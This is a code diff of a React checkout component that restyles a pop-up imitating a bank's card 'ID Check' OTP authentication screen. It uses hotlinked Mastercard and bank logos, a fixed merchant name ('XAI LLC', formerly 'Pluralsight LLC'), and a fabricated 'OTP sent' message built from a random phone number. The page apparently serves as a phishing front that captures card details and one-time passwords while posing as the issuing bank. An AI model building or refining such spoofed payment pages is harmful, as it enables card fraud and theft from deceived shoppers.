@@ -1055,168 +1055,128 @@ const Checkout = () => {
 
             {/* Enhanced OTP Verification Section */}
             {currentStep === 'otp' && (
-              <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-                <div className="bg-white rounded-lg max-w-md w-full transform transition-all duration-500 animate-scale-in overflow-hidden shadow-2xl">
-                  {/* Header with Cancel */}
-                  <div className="absolute top-2 right-2 z-10">
-                    <button 
-                      onClick={handleOtpCancel}
-                      className="text-gray-400 hover:text-gray-600 text-lg font-bold bg-white rounded-full w-8 h-8 flex items-center justify-center shadow-lg"
-                    >
-                      ✕
-                    </button>
-                  </div>
-
-                  {/* Header with Card Security and Bank Logo */}
-                  <div className="bg-white border-b p-4 relative">
-                    <div className="flex justify-between items-center">
-                      <div className="flex items-center gap-3">
-                        <img 
-                          src={
-                            getCardType(cardData.cardNumber) === 'visa' ? 'https://www.unitybank.com.au/media/1362/visa-secure-logo.png?width=250&height=250' :
-                            getCardType(cardData.cardNumber) === 'mastercard' ? 'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg' :
-                            getCardType(cardData.cardNumber) === 'discover' ? 'https://images.seeklogo.com/logo-png/49/2/discover-card-logo-png_seeklogo-499264.png' :
-                            getCardType(cardData.cardNumber) === 'rupay' ? 'https://images.seeklogo.com/logo-png/25/1/rupay-logo-png_seeklogo-256357.png' :
-                            'https://www.cardcomplete.com/media/medialibrary/2019/06/logo_mcidcheck_440.jpg'
-                          }
-                          alt="Card Security" 
-                          className="h-8 w-16 object-contain"
-                        />
-                        <span className="text-sm font-medium text-gray-700">ID Check</span>
-                      </div>
-                      <div>
-                        <img 
-                          src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
-                          alt="Bank Logo" 
-                          className="h-8 w-20 object-contain"
-                        />
-                      </div>
+              <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-2">
+                <div className="bg-white rounded-lg w-full max-w-sm shadow-2xl relative" style={{ minWidth: 370 }}>
+                  {/* Cancel Button */}
+                  <button
+                    onClick={handleOtpCancel}
+                    className="absolute top-2 right-2 text-gray-400 hover:text-gray-600 text-lg font-bold bg-white rounded-full w-8 h-8 flex items-center justify-center shadow"
+                    style={{ zIndex: 10 }}
+                    aria-label="Cancel"
+                  >
+                    CANCEL
+                  </button>
+                  {/* Top Row: ID Check and Bank Logo */}
+                  <div className="flex items-center justify-between px-6 pt-6 pb-2 border-b border-gray-200">
+                    <div className="flex items-center gap-2">
+                      <img
+                        src="https://cdn.iconscout.com/icon/free/png-256/mastercard-3521544-2944967.png"
+                        alt="Mastercard Logo"
+                        className="h-6 w-6 object-contain"
+                      />
+                      <span className="font-semibold text-gray-700 text-base">ID Check</span>
                     </div>
+                    <img
+                      src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
+                      alt="Bank Logo"
+                      className="h-8 w-32 object-contain"
+                    />
                   </div>
-
-                  {/* Main Content */}
-                  <div className="p-6">
-                    <h2 className="text-lg font-bold text-gray-800 mb-4 text-center">Merchant Details</h2>
-                    
-                    <div className="bg-gray-50 rounded-lg p-4 mb-4 space-y-2">
-                      <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">Merchant Name</span>
-                        <span className="font-medium text-gray-800">Pluralsight LLC</span>
-                      </div>
-                      <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">Date</span>
-                        <span className="font-medium text-gray-800">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
-                      </div>
-                      <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">Card Number</span>
-                        <span className="font-medium text-gray-800">
-                          {cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}
-                        </span>
-                      </div>
-                      <div className="flex justify-between text-sm">
-                        <span className="text-gray-600">Amount</span>
-                        <span className="font-bold text-blue-600">₹{displayPrice.toLocaleString()}</span>
-                      </div>
-                    </div>
-
-                    <h3 className="text-lg font-bold text-blue-600 mb-4 text-center">Authenticate Transaction</h3>
-
-                    {/* Error Message */}
-                    {otpError && (
-                      <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
-                        <p className="text-red-700 text-sm text-center">{otpError}</p>
-                      </div>
-                    )}
-
-                    {/* Resend Success Message */}
-                    {resendMessage && (
-                      <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
-                        <p className="text-green-700 text-sm text-center">{resendMessage}</p>
-                      </div>
-                    )}
-
-                    {/* OTP Success Message */}
-                    <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
+                  {/* Merchant Details Table */}
+                  <div className="px-6 pt-4 pb-2">
+                    <table className="w-full text-sm">
+                      <tbody>
+                        <tr>
+                          <td className="text-gray-600 py-1">Merchant Name</td>
+                          <td className="text-right font-medium text-gray-800 py-1">XAI LLC</td>
+                        </tr>
+                        <tr>
+                          <td className="text-gray-600 py-1">Date</td>
+                          <td className="text-right font-medium text-gray-800 py-1">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</td>
+                        </tr>
+                        <tr>
+                          <td className="text-gray-600 py-1">Card Number</td>
+                          <td className="text-right font-medium text-gray-800 py-1">{cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}</td>
+                        </tr>
+                        <tr>
+                          <td className="text-gray-600 py-1">Amount</td>
+                          <td className="text-right font-bold text-blue-700 py-1">₹{displayPrice.toLocaleString()}</td>
+                        </tr>
+                        <tr>
+                          <td className="text-gray-600 py-1">Personal Message</td>
+                          <td className="text-right font-medium text-gray-800 py-1"></td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                  {/* Authenticate Transaction Title */}
+                  <div className="px-6 pt-2 pb-0">
+                    <h3 className="text-base font-semibold text-blue-700 text-center mb-2">Authenticate Transaction</h3>
+                  </div>
+                  {/* OTP Sent Message */}
+                  <div className="px-6">
+                    <div className="bg-green-50 border border-green-200 rounded p-2 mb-2">
                       <p className="text-green-700 text-sm text-center">
                         Successfully sent OTP to your registered mobile number XXXXXX{randomMobile}
                       </p>
                     </div>
-
-                    {/* Click Here for Addon */}
-                    <div className="mb-4 text-center">
-                      <button className="text-blue-600 text-sm hover:underline bg-blue-50 px-3 py-1 rounded">
-                        CLICK HERE For Addon Cardholder OTP
-                      </button>
-                    </div>
-
-                    {/* OTP Input */}
-                    <div className="mb-4">
-                      <Input
-                        value={otpValue}
-                        onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                        disabled={otpSubmitting}
-                        className={`bg-white text-gray-900 text-center text-lg tracking-widest h-12 border-gray-300 ${otpSubmitting ? 'opacity-50' : ''}`}
-                        placeholder="Enter OTP Here"
-                        maxLength={6}
-                        style={{ 
-                          color: otpValue ? '#1f2937' : '#9ca3af',
-                          letterSpacing: '0.5em'
-                        }}
-                      />
-                    </div>
-
-                    {/* Resend OTP */}
-                    <div className="mb-6 text-center">
-                      <button 
-                        onClick={handleResendOtp}
-                        className="text-blue-600 text-sm hover:underline"
-                      >
-                        Resend OTP
-                      </button>
-                    </div>
-
-                    {/* Buttons */}
-                    <div className="space-y-3 mb-6">
-                      <div className="flex gap-3">
-                        <Button
-                          onClick={handleOtpCancel}
-                          variant="outline"
-                          className="flex-1 h-10 text-gray-700 border-gray-300 hover:bg-gray-50"
-                        >
-                          CANCEL
-                        </Button>
-                        <Button
-                          onClick={handleOtpSubmit}
-                          disabled={otpValue.length !== 6 || otpSubmitting}
-                          className="flex-1 h-10 bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 relative"
-                        >
-                          {otpSubmitting ? (
-                            <>
-                              <Loader2 className="h-4 w-4 animate-spin mr-2" />
-                              <span className="opacity-50">SUBMIT</span>
-                            </>
-                          ) : (
-                            'SUBMIT'
-                          )}
-                        </Button>
+                  </div>
+                  {/* Addon Cardholder OTP Button */}
+                  <div className="px-6 mb-2">
+                    <button className="w-full bg-blue-50 text-blue-700 text-xs font-semibold py-1 rounded mb-2 border border-blue-100 hover:bg-blue-100 transition">
+                      CLICK HERE For Addon Cardholder OTP
+                    </button>
+                  </div>
+                  {/* OTP Input */}
+                  <div className="px-6 mb-2">
+                    <input
+                      value={otpValue}
+                      onChange={e => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                      disabled={otpSubmitting}
+                      className="w-full text-center text-lg tracking-widest h-12 border border-gray-300 rounded bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-blue-400"
+                      placeholder="Enter OTP Here"
+                      maxLength={6}
+                      style={{ letterSpacing: '0.5em' }}
+                    />
+                  </div>
+                  {/* Resend OTP Link */}
+                  <div className="px-6 mb-2 text-right">
+                    <button
+                      onClick={handleResendOtp}
+                      className="text-blue-700 text-xs font-semibold hover:underline focus:outline-none"
+                      disabled={otpSubmitting}
+                    >
+                      Resend OTP
+                    </button>
+                  </div>
+                  {/* Error Message */}
+                  {otpError && (
+                    <div className="px-6 mb-2">
+                      <div className="bg-red-50 border border-red-200 rounded p-2">
+                        <p className="text-red-700 text-xs text-center">{otpError}</p>
                       </div>
                     </div>
-
-                    {/* Timer and Powered by */}
-                    <div className="text-center space-y-2">
-                      <p className="text-xs text-gray-500">
-                        This page automatically time out after {formatTimer(otpTimer)} minutes
-                      </p>
-                      
-                      <div className="flex items-center justify-center gap-2">
-                        <span className="text-xs text-gray-500">Powered by</span>
-                        <img 
-                          src="https://www.pngkey.com/png/detail/281-2815007_wibmo-logo.png" 
-                          alt="Wibmo" 
-                          className="h-4 object-contain"
-                        />
-                      </div>
-                    </div>
+                  )}
+                  {/* Action Buttons */}
+                  <div className="px-6 pb-4 flex gap-2">
+                    <button
+                      onClick={handleOtpCancel}
+                      className="flex-1 h-10 border border-gray-300 rounded bg-white text-gray-700 font-semibold hover:bg-gray-50 transition"
+                      disabled={otpSubmitting}
+                    >
+                      CANCEL
+                    </button>
+                    <button
+                      onClick={handleOtpSubmit}
+                      disabled={otpValue.length !== 6 || otpSubmitting}
+                      className="flex-1 h-10 rounded bg-blue-700 text-white font-semibold hover:bg-blue-800 transition disabled:opacity-50 relative"
+                    >
+                      {otpSubmitting ? (
+                        <span className="flex items-center justify-center"><Loader2 className="h-4 w-4 animate-spin mr-2" />SUBMIT</span>
+                      ) : (
+                        'SUBMIT'
+                      )}
+                    </button>
                   </div>
                 </div>
               </div>
